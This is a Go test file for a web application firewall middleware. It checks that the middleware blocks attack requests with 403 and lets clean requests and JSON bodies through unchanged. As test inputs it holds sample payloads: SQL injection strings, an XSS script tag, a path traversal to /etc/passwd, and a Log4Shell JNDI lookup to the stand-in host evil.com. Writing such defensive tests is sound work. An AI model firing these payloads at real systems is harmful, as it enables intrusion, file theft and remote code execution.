package waf

import (
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"

	"rhinowaf/waf/engine"
)

// installEngine sets the process engine for a test and clears it after.
func installEngine(t *testing.T) *engine.Engine {
	t.Helper()
	rs, err := engine.Loader{}.Load()
	if err != nil {
		t.Fatal(err)
	}
	e := engine.New(engine.DefaultConfig(), rs)
	engine.SetDefault(e)
	t.Cleanup(func() { engine.SetDefault(nil) })
	return e
}

func TestEngineBlocksThroughMiddleware(t *testing.T) {
	installEngine(t)
	next := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) { w.WriteHeader(200) })
	mw := ProtectMiddleware(next)

	attacks := []struct {
		name, method, target, body, ctype string
	}{
		{"sqli query", "GET", "/search?q=" + enc("' or 1=1--"), "", ""},
		{"xss body", "POST", "/c", "comment=" + enc("<script>alert(1)</script>"), "application/x-www-form-urlencoded"},
		{"traversal", "GET", "/f?path=" + enc("../../etc/passwd"), "", ""},
		{"log4j header", "GET", "/", "", ""},
	}
	for _, a := range attacks {
		var body *strings.Reader
		if a.body != "" {
			body = strings.NewReader(a.body)
		} else {
			body = strings.NewReader("")
		}
		req := httptest.NewRequest(a.method, a.target, body)
		req.Header.Set("User-Agent", "Mozilla/5.0")
		if a.ctype != "" {
			req.Header.Set("Content-Type", a.ctype)
		}
		if a.name == "log4j header" {
			req.Header.Set("X-Api-Version", "${jndi:ldap://evil.com/x}")
		}
		rec := httptest.NewRecorder()
		mw.ServeHTTP(rec, req)
		if rec.Code != http.StatusForbidden {
			t.Errorf("%s: expected 403, got %d", a.name, rec.Code)
		}
	}
}

func TestEngineAllowsCleanThroughMiddleware(t *testing.T) {
	installEngine(t)
	got := false
	next := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) { got = true; w.WriteHeader(200) })
	mw := ProtectMiddleware(next)

	req := httptest.NewRequest("GET", "/products?category=shoes&q="+enc("grant writing tips"), nil)
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
	req.Header.Set("Accept", "text/html")
	rec := httptest.NewRecorder()
	mw.ServeHTTP(rec, req)
	if !got || rec.Code != 200 {
		t.Fatalf("clean request blocked: code=%d reached=%v", rec.Code, got)
	}
}

func TestEngineJSONBodyPassesToBackendIntact(t *testing.T) {
	installEngine(t)
	clean := `{"name":"alice","note":"hello world, nothing bad here"}`
	var received string
	next := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		buf := make([]byte, 4096)
		n, _ := r.Body.Read(buf)
		received = string(buf[:n])
		w.WriteHeader(200)
	})
	mw := ProtectMiddleware(next)
	req := httptest.NewRequest("POST", "/api", strings.NewReader(clean))
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("User-Agent", "Mozilla/5.0")
	rec := httptest.NewRecorder()
	mw.ServeHTTP(rec, req)
	if rec.Code != 200 {
		t.Fatalf("clean json blocked: %d", rec.Code)
	}
	if received != clean {
		t.Fatalf("backend got mangled body:\n got %q\nwant %q", received, clean)
	}
}

func TestEngineJSONAttackBlocked(t *testing.T) {
	installEngine(t)
	next := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) { w.WriteHeader(200) })
	mw := ProtectMiddleware(next)
	req := httptest.NewRequest("POST", "/api", strings.NewReader(`{"user":"admin","q":"1' union select password from users--"}`))
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("User-Agent", "Mozilla/5.0")
	rec := httptest.NewRecorder()
	mw.ServeHTTP(rec, req)
	if rec.Code != http.StatusForbidden {
		t.Fatalf("json sqli not blocked: %d", rec.Code)
	}
}

func enc(s string) string {
	var b strings.Builder
	for i := 0; i < len(s); i++ {
		c := s[i]
		if (c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') || (c >= '0' && c <= '9') || c == '-' || c == '_' || c == '.' || c == '~' {
			b.WriteByte(c)
		} else {
			const h = "0123456789ABCDEF"
			b.WriteByte('%')
			b.WriteByte(h[c>>4])
			b.WriteByte(h[c&0xf])
		}
	}
	return b.String()
}
